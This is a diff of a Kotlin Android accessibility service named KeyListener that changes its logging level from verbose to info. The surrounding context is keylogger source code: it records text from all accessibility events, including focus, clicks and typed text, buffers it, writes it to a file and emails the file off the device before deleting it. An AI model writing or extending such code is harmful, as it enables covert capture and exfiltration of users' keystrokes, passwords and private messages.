@@ -19,7 +19,7 @@ class KeyListener : AccessibilityService() {
 
     var res = ""
     public override fun onServiceConnected() {
-        Log.v(TAG, "Onservice() Connected...")
+        Log.i(TAG, "Onservice() Connected...")
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
@@ -39,7 +39,7 @@ class KeyListener : AccessibilityService() {
                 $res$data
                 
                 """.trimIndent()
-                Log.v(TAG, data)
+                Log.i(TAG, data)
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 var data = event.text.toString()
@@ -48,7 +48,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v(TAG, data)
+                Log.i(TAG, data)
             }
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 var data = event.text.toString()
@@ -57,7 +57,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v(TAG, data)
+                Log.i(TAG, data)
                 if (res.length > 1000) {
                     try {
                         val file = File(applicationContext.getExternalFilesDir(null), "Log.txt")
@@ -88,11 +88,11 @@ class KeyListener : AccessibilityService() {
                                     sm.execute()
                                     file.delete()
                                 } catch (e: Exception) {
-                                    Log.v("err", "Error while sending mail:" + e.message)
+                                    Log.i("err", "Error while sending mail:" + e.message)
                                 }
                         }
                     } catch (e: Exception) {
-                        Log.v("msg", e.message!!)
+                        Log.i("msg", e.message!!)
                     }
                     res = ""
                 }
